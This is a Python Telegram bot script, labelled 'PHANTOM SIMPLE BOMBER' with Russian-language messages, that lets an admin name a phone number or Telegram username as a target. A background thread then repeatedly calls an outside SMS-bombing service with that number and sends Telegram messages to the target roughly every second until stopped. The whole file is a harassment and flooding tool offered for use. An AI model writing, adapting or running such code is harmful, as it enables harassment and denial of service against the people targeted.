import os
import threading
import time
import random
import requests
from telebot import TeleBot

BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID"))

bot = TeleBot(BOT_TOKEN)
bombing = False
target = None

print("[+] PHANTOM SIMPLE BOMBER ЗАПУЩЕН")

@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(message.chat.id, "Привет. Напиши /bomb чтобы начать бомбинг.")

@bot.message_handler(commands=['bomb'])
def start_bomb(message):
    global target, bombing
    if message.from_user.id != ADMIN_ID:
        bot.send_message(message.chat.id, "Доступ запрещён.")
        return

    bot.send_message(message.chat.id, "Отправь цель для бомбинга (номер телефона или @username):")
    bot.register_next_step_handler(message, get_target)

def get_target(message):
    global target, bombing
    target = message.text.strip()
    bombing = True

    bot.send_message(message.chat.id, f"🚀 Бомбинг запущен на цель: {target}\n\nНапиши /stop чтобы остановить.")

    # Запускаем бомбинг в отдельном потоке
    threading.Thread(target=bomb_worker, daemon=True).start()

def bomb_worker():
    global bombing
    while bombing:
        try:
            # Простой SMS бомб
            requests.get(f"https://smsbomb.ru/api?phone={target}", timeout=5)
            # Telegram бомб
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                         json={"chat_id": target, "text": "💣 PHANTOM BOMB 💣"}, timeout=5)
        except:
            pass
        time.sleep(random.uniform(0.5, 1.5))

@bot.message_handler(commands=['stop'])
def stop_bomb(message):
    global bombing
    if message.from_user.id != ADMIN_ID:
        return
    bombing = False
    bot.send_message(message.chat.id, "Бомбинг остановлен.")

print("[+] Бот готов. Команды: /start, /bomb, /stop")
bot.infinity_polling(none_stop=True)
